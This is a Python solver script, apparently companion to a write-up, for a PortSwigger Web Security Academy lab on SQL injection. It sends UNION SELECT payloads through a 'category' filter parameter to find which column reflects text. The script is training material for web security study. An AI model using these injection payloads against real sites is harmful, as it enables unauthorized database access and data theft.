#!/usr/bin/env python3
"""
SQL injection UNION attack, finding a column containing text
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 08-union-find-column-containing-text.md

What this does:
    With the column count already confirmed at 3 (as given by this lab), tries
    the lab's own random marker string in each column position in turn and
    reports which position reflects it back -- that's the lab's solve condition.
    The marker string is read directly from the lab's homepage banner.

Usage:
    python 08-union-find-column-containing-text.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

COLUMN_COUNT = 3


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    home = client.get(lab_url)
    m = re.search(r"retrieve the string: '([A-Z0-9]+)'", home.text)
    if not m:
        print("[-] Could not find the lab's required marker string on the homepage.")
        return
    required = m.group(1)
    print(f"[*] Required marker string: {required}")

    for i in range(COLUMN_COUNT):
        parts = ["NULL"] * COLUMN_COUNT
        parts[i] = f"'{required}'"
        payload = f"Gifts' UNION SELECT {','.join(parts)}-- "
        r = client.get(f"{lab_url}/filter", params={"category": payload})
        found = required in r.text
        print(f"[*] Column {i}: {'reflected' if found else 'not reflected'}")
        if found:
            print(f"[+] Text-bearing column index: {i}")
            break

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
